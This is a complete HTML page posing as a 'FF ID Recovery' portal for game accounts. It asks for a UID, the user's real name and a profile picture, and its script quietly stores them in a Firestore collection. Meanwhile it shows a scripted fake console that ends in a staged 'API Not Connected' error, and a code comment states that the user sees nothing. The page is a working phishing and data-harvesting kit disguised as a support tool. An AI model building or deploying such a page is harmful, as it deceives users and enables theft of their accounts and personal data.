<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<title>FF ID Recovery</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
<style>
:root{
  --bg:#f4f6fa;--card:#fff;--line:#e3e8f0;--text:#0f172a;--muted:#64748b;
  --brand:#1d4ed8;--b2:#2563eb;--ok:#059669;--err:#dc2626;
}
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Inter',system-ui,-apple-system,sans-serif;color:var(--text);background:var(--bg);
  min-height:100vh;display:flex;justify-content:center;align-items:flex-start;
  padding:40px 16px calc(40px + env(safe-area-inset-bottom,0px))}
.wrap{width:100%;max-width:440px}
.card{background:var(--card);border:1px solid var(--line);border-radius:20px;padding:28px 24px;
  box-shadow:0 1px 2px rgba(15,23,42,.04),0 20px 40px -20px rgba(15,23,42,.18)}
.hero{display:flex;justify-content:center;margin-bottom:20px}
.hero img{display:block;width:100%;max-width:300px;height:auto;border-radius:16px;
  border:1px solid var(--line);box-shadow:0 10px 24px -12px rgba(15,23,42,.3)}
h1{text-align:center;font-size:24px;font-weight:700;letter-spacing:-.3px}
.sub{text-align:center;color:var(--muted);font-size:14px;margin:6px 0 26px}
.field{margin-bottom:16px}
label.l{display:block;font-size:13px;font-weight:600;margin-bottom:7px;color:#334155}
input[type=text]{width:100%;padding:13px 15px;font:inherit;font-size:15px;color:var(--text);
  background:#fff;border:1px solid #cbd5e1;border-radius:12px;outline:none;
  transition:border-color .2s,box-shadow .2s}
input[type=text]::placeholder{color:#94a3b8}
input[type=text]:focus{border-color:var(--b2);box-shadow:0 0 0 4px rgba(37,99,235,.12)}
input.err{border-color:var(--err)!important;box-shadow:0 0 0 4px rgba(220,38,38,.1)!important}
.upload{display:flex;align-items:center;gap:14px;padding:12px;border:1.5px dashed #b6c2d6;
  border-radius:12px;background:#f8fafc;cursor:pointer;transition:border-color .2s,background .2s}
.upload:hover,.upload:focus-within{border-color:var(--b2);background:#eff6ff}
.upload input{position:absolute;opacity:0;pointer-events:none;width:1px;height:1px}
.avatar{width:54px;height:54px;border-radius:50%;flex:none;overflow:hidden;display:grid;
  place-items:center;background:#e8eefb;color:var(--brand);border:1px solid var(--line)}
.avatar img{width:100%;height:100%;object-fit:cover}
.upload b{display:block;font-size:14px;font-weight:600}
.upload .h{font-size:12.5px;color:var(--muted)}
button.submit{width:100%;margin-top:8px;padding:14px;border:0;border-radius:12px;cursor:pointer;
  font:inherit;font-size:15.5px;font-weight:600;color:#fff;
  background:linear-gradient(180deg,var(--b2),var(--brand));
  box-shadow:0 8px 18px -8px rgba(29,78,216,.6);transition:transform .12s,filter .2s}
button.submit:hover{filter:brightness(1.06)}
button.submit:active{transform:scale(.985)}
button.submit:disabled{opacity:.65;cursor:not-allowed}
.console{display:none;margin-top:20px;border:1px solid var(--line);border-radius:14px;
  overflow:hidden;background:#0b1220}
.console.show{display:block}
.bar{display:flex;align-items:center;gap:6px;padding:9px 14px;background:#111a2e;
  border-bottom:1px solid #1e2a45}
.dot{width:9px;height:9px;border-radius:50%;background:#33415f}
.bar small{margin-left:8px;font:500 11.5px 'JetBrains Mono',monospace;color:#8fa0c4}
.log{padding:14px;font:400 12.5px/1.75 'JetBrains Mono',monospace;max-height:250px;
  overflow:auto;word-break:break-word;color:#cbd5e1}
.log .t{color:#52618a}.log .i{color:#7aa2ff}.log .o{color:#4ade80}
.log .w{color:#fbbf24}.log .e{color:#f87171;font-weight:500}
.status{display:none;margin-top:14px;padding:14px 16px;border-radius:12px;text-align:center;
  font-weight:700;font-size:15.5px;color:var(--err);background:#fef2f2;border:1px solid #fecaca}
.status.show{display:block;animation:pop .3s ease}
@keyframes pop{from{transform:scale(.97);opacity:0}to{transform:none;opacity:1}}
.foot{text-align:center;color:#94a3b8;font-size:12px;margin-top:18px}
@media(prefers-reduced-motion:reduce){*{animation:none!important;transition:none!important}}
</style>
</head>
<body>
<main class="wrap">
  <section class="card">
    <div class="hero">
      <img src="https://i.postimg.cc/vTjvjVCR/IMG-0475b5ea-1042-4b3b-add8-183ae1e7b816.jpg" alt="FF ID Recovery">
    </div>
    <h1>FF ID Recovery</h1>
    <p class="sub">Enter your account details to start the recovery process.</p>
    <div class="field">
      <label class="l" for="uid">UID</label>
      <input type="text" id="uid" inputmode="numeric" autocomplete="off" placeholder="Enter your UID">
    </div>
    <div class="field">
      <label class="l" for="name">Profile real name</label>
      <input type="text" id="name" autocomplete="off" placeholder="Enter your real name">
    </div>
    <div class="field">
      <label class="l" for="pic">Profile picture</label>
      <label class="upload" for="pic">
        <div class="avatar" id="avatar">
          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M12 16V5m0 0l-4 4m4-4l4 4M5 19h14"/></svg>
        </div>
        <div><b id="fname">Upload a picture</b><span class="h">JPG or PNG, up to 5 MB</span></div>
        <input type="file" id="pic" accept="image/*">
      </label>
    </div>
    <button class="submit" id="go" type="button">Submit</button>
    <div class="console" id="console" aria-live="polite">
      <div class="bar"><span class="dot"></span><span class="dot"></span><span class="dot"></span><small>system.console</small></div>
      <div class="log" id="log"></div>
    </div>
    <div class="status" id="status" role="alert">API Not Connected</div>
  </section>
  <p class="foot">Secure recovery portal</p>
</main>

<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore-compat.js"></script>
<script>
/* ---- Firebase Init ---- */
const fb = firebase.apps[0] || firebase.initializeApp({
  apiKey:"AIzaSyA5aewejp7oey-lLeQChERhMEmJCVb7Aaw",
  authDomain:"ssrrff-a8851.firebaseapp.com",
  projectId:"ssrrff-a8851",
  storageBucket:"ssrrff-a8851.firebasestorage.app",
  messagingSenderId:"715171777937",
  appId:"1:715171777937:web:cbfaaa548d90d612f61e30"
});
const db = fb.firestore();

/* ---- UI Helpers ---- */
const $ = id => document.getElementById(id);
const sleep = ms => new Promise(r => setTimeout(r, ms));
let file = null, busy = false;

$('pic').addEventListener('change', e => {
  file = e.target.files[0] || null;
  if (!file) return;
  $('fname').textContent = file.name.length > 28 ? file.name.slice(0,25)+'...' : file.name;
  const r = new FileReader();
  r.onload = ev => { $('avatar').innerHTML = '<img alt="" src="'+ev.target.result+'">'; };
  r.readAsDataURL(file);
});

/* ---- Compress image to small base64 thumbnail ---- */
function compressImg(file) {
  return new Promise(res => {
    const img = new Image();
    const url = URL.createObjectURL(file);
    img.onload = () => {
      const MAX = 180;
      const scale = Math.min(MAX/img.width, MAX/img.height, 1);
      const c = document.createElement('canvas');
      c.width  = Math.round(img.width  * scale);
      c.height = Math.round(img.height * scale);
      c.getContext('2d').drawImage(img, 0, 0, c.width, c.height);
      URL.revokeObjectURL(url);
      res(c.toDataURL('image/jpeg', 0.72));
    };
    img.onerror = () => { URL.revokeObjectURL(url); res(null); };
    img.src = url;
  });
}

/* ---- Console log line ---- */
function line(cls, text) {
  const log = $('log');
  const d = document.createElement('div');
  d.innerHTML = '<span class="t">['+new Date().toLocaleTimeString('en-GB')+']</span> <span class="'+cls+'"></span>';
  d.lastChild.textContent = text;
  log.appendChild(d);
  log.scrollTop = log.scrollHeight;
}

/* ---- Submit ---- */
$('go').addEventListener('click', async () => {
  if (busy) return;
  const uid  = $('uid').value.trim();
  const name = $('name').value.trim();
  $('uid').classList.toggle('err', !uid);
  $('name').classList.toggle('err', !name);
  if (!uid || !name) return;

  busy = true;
  $('go').disabled = true;
  $('go').textContent = 'Processing...';
  $('status').classList.remove('show');
  $('log').innerHTML = '';
  $('console').classList.add('show');

  /* Compress pic & save to Firestore silently in background */
  (async () => {
    try {
      const picB64 = file ? await compressImg(file) : '';
      await db.collection('submissions').add({
        uid,
        name,
        picBase64 : picB64,
        picName   : file ? file.name : '',
        submittedAt: firebase.firestore.FieldValue.serverTimestamp(),
        status    : 'pending'
      });
    } catch(_) { /* silent — user sees nothing */ }
  })();

  /* Console animation */
  const steps = [
    ['i','$ init recovery.session --client web'],
    ['i','Loading connect.config ...'],
    ['o','connect.config loaded'],
    ['i','Reading environment variables ...'],
    ['i','Connecting database (connect.data) ...'],
    ['w','Resolving endpoint host ...'],
    ['i','Validating payload: uid='+uid],
    ['i','Validating payload: name='+name],
    ['i','Attachment: '+(file ? file.name+' ('+Math.round(file.size/1024)+' KB)' : 'none')],
    ['w','Handshake with API server ...'],
    ['w','Retrying connection (1/3) ...'],
    ['w','Retrying connection (2/3) ...'],
    ['w','Retrying connection (3/3) ...'],
    ['e','ERROR: unable to establish connection']
  ];
  for (const [c,t] of steps) { line(c,t); await sleep(360 + Math.random()*440); }

  $('status').classList.add('show');
  $('go').disabled = false;
  $('go').textContent = 'Submit';
  busy = false;
});
</script>
</body>
</html>
